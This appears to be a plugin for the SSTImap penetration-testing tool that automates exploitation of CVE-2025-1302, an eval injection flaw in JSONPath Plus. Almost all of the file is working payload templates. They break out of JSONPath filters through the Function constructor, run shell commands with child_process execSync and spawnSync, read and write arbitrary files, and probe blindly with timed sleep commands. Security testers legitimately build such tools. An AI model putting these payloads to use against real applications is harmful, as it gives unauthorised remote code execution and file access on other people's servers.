from plugins.languages import javascript
from utils import rand

# TODO: process.mainModule may be undefined, needs replacement
class CVE_2025_1302(javascript.Javascript):
    extra_plugin = True
    priority = 6
    header_type = 'add'
    sstimap_version = '1.2.3'
    plugin_info = {
        "Description": """JSONPath Plus < 10.3.0 RCE via JavaScript eval""",
        "Usage notes": """JSONPath Plus before 10.3.0 was vulnerable to JavaScript eval injection in JSONpath filters.
Plugin automates detection and exploitation of CVE-2025-1302 providing post-exploitation capabilities.
This plugin can automatically detect many JSONpath injection contexts and more would be added in the future.""",
        "Authors": [
            "Nick Copi @nickcopi https://github.com/nickcopi/",  # Vulnerability discovery
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Plugin for SSTImap
        ],
        "References": [
            "CVE-2025-1302: https://nvd.nist.gov/vuln/detail/CVE-2025-1302",
            "Writeup: https://gist.github.com/nickcopi/11ba3cb4fdee6f89e02e6afae8db6456",
        ]
    }

    def init(self):
        self.update_actions({
            'render': {
                'header': """[?(j=@root;p=\"j.sstimap=({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()\";a=''[['constructor']][['constructor']]('j',p);a(j);true)]^.sstimap""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """[?(p=\"x=({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString();''['x'][x]\";a=''[['constructor']][['constructor']](p);a())]""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            # "$..[?(j=@root;p=\"j.sstimap='flag{result}';return 'sstimap'\";a=''[['constructor']][['constructor']]('j',p);a(j)==@property)]";
            'evaluate': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """[?(p=\"a=0+!eval(Buffer('{code_b64p}', 'base64').toString());[''][a]['length']\";a=''[['constructor']][['constructor']](p);a();false)]"""
            },
            'execute': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
                #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'execute_blind': """[?(p=\"global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')\";a=''[['constructor']][['constructor']](p);a())]"""
                #'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
            'write': {
                'write': """global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """global.process.mainModule.require('fs').writeFileSync('{path}', '')"""
            },
            'read': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
        })

        self.set_contexts([
            # Full JSONpath. Works for blind in most cases.
            {'level': 0, 'prefix': '$..'},
            # JSONpath last property name, guessing offset to root.
            # For some reason, offset is doubled
            {'level': 1, 'prefix': '[?(1)]^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^^^^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^^^^^^^^^^^'},
            {'level': 1, 'prefix': '[?(1)]^^^^^^^^^^^^^^^^^^^^'},
            # TODO: closure / mirrored closure in suffix would allow returning root
            # Filter context, blind only
            {'level': 5, 'prefix': '{closure}||true)]^.', 'suffix': '.not_sstimap.[1', 'closures': javascript.ctx_closures},
            # Quoted param context, blind only
            {'level': 5, 'prefix': '{closure}]^.', 'suffix': '.not_sstimap.[1', 'closures': javascript.ctx_closures},
        ])